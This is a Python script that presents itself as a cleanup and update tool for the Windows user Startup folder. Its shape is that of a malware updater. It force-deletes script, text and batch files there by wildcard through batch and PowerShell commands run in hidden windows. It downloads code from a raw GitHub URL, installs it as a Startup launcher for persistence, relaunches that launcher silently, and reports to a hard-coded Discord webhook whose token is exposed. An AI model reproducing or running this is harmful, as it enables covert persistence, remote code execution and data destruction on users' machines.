# monitor_script.py - Force deletion with multiple methods
import os
import sys
import subprocess
import tempfile
import time
import requests
import shutil

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send simple webhook"""
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def delete_locked_files():
    """Multiple methods to delete locked files"""
    startup = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # List of files to delete (specific targets)
    files_to_delete = [
        "Startup.pyw",  # The current launcher
        "startup_log.txt",
        "monitor_script.py",
        "monitor.py",
        "update_cache.json",
        "requirements.txt",
        "github_launcher.pyw",
        "clean_launcher.pyw"
    ]
    
    # Also delete any .log, .txt, .json, .py files
    patterns = ['.log', '.txt', '.json', '.py', '.pyw', '.pyc', '.bat']
    
    print("Starting forced deletion...")
    
    # Method 1: Use Windows move command (can move locked files)
    batch1 = f'''@echo off
cd /d "{startup}"

echo [1/3] Moving locked files to temp...
move "Startup.pyw" "%TEMP%\\Startup_old.pyw" 2>nul
move "startup_log.txt" "%TEMP%\\startup_log_old.txt" 2>nul
move "monitor_script.py" "%TEMP%\\monitor_old.py" 2>nul

:: Delete from temp
del /f /q "%TEMP%\\Startup_old.pyw" 2>nul
del /f /q "%TEMP%\\startup_log_old.txt" 2>nul
del /f /q "%TEMP%\\monitor_old.py" 2>nul

echo Files moved and deleted from temp
'''
    
    # Method 2: Force delete with retries
    batch2 = f'''@echo off
cd /d "{startup}"

echo [2/3] Force deleting remaining files...

:: Delete specific files with multiple attempts
:retry_delete
del /f /q startup_log.txt 2>nul
del /f /q Startup.pyw 2>nul
del /f /q monitor_script.py 2>nul
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul

:: Check if files still exist
if exist startup_log.txt (
    timeout /t 1 /nobreak >nul
    goto retry_delete
)

if exist Startup.pyw (
    timeout /t 1 /nobreak >nul
    goto retry_delete
)

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo Force deletion complete
'''
    
    # Method 3: Use PowerShell to delete (most powerful)
    batch3 = f'''@echo off
cd /d "{startup}"

echo [3/3] PowerShell force delete...

powershell -Command "Get-ChildItem -Path '{startup}' -Include *.log,*.txt,*.json,*.py,*.pyw,*.pyc,*.bat -File -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue"
powershell -Command "Get-ChildItem -Path '{startup}' -Directory -Filter '__pycache__' -Recurse | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue"

echo Cleanup complete!
'''
    
    # Execute all methods
    for i, batch_script in enumerate([batch1, batch2, batch3]):
        batch_path = tempfile.gettempdir() + f"/delete_method{i}.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_script)
        
        # Run hidden with wait
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        process = subprocess.run(
            ['cmd', '/c', batch_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10
        )
        
        # Clean up batch file
        time.sleep(1)
        try:
            os.remove(batch_path)
        except:
            pass
        
        time.sleep(2)  # Wait between methods
    
    return True

def download_new_launcher():
    """Download the new github_launcher.pyw"""
    try:
        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        startup = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Download new launcher
        import urllib.request
        new_code = urllib.request.urlopen(launcher_url).read().decode('utf-8')
        
        # Write to startup folder
        launcher_path = os.path.join(startup, "Startup.pyw")
        with open(launcher_path, 'w', encoding='utf-8') as f:
            f.write(new_code)
        
        # Also copy as github_launcher.pyw
        backup_path = os.path.join(startup, "github_launcher.pyw")
        with open(backup_path, 'w', encoding='utf-8') as f:
            f.write(new_code)
        
        print("✓ New launcher installed")
        return True
        
    except Exception as e:
        print(f"✗ Failed to download launcher: {e}")
        return False

def schedule_restart():
    """Schedule a restart of the new launcher"""
    try:
        startup = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        launcher_path = os.path.join(startup, "Startup.pyw")
        
        if os.path.exists(launcher_path):
            # Create batch file to restart launcher
            batch = f'''@echo off
timeout /t 5 /nobreak >nul
start /b "" "{sys.executable}" "{launcher_path}"
del "%~f0"
'''
            
            batch_path = tempfile.gettempdir() + "/restart_launcher.bat"
            with open(batch_path, 'w') as f:
                f.write(batch)
            
            # Run hidden
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            subprocess.Popen(
                ['cmd', '/c', batch_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return True
            
    except:
        pass
    
    return False

def main():
    """Main cleanup and update function"""
    print("=" * 60)
    print("FORCE DELETE & LAUNCHER UPDATE")
    print("=" * 60)
    
    # Step 1: Force delete all files
    print("\n[1/3] Force deleting all files from startup folder...")
    delete_locked_files()
    
    # Step 2: Download new launcher
    print("\n[2/3] Downloading new launcher from GitHub...")
    download_new_launcher()
    
    # Step 3: Schedule restart of new launcher
    print("\n[3/3] Scheduling restart...")
    schedule_restart()
    
    # Send webhook
    print("\n[+] Sending webhook...")
    send_webhook("✅ FORCE CLEANUP COMPLETE: All files deleted, new launcher installed!")
    
    print("\n" + "=" * 60)
    print("CLEANUP SUCCESSFUL!")
    print("✓ All files deleted from startup folder")
    print("✓ New launcher installed (github_launcher.pyw)")
    print("✓ Launcher will restart in 5 seconds")
    print("=" * 60)
    
    # This script will exit, and the new launcher will start
    time.sleep(3)

if __name__ == "__main__":
    main()
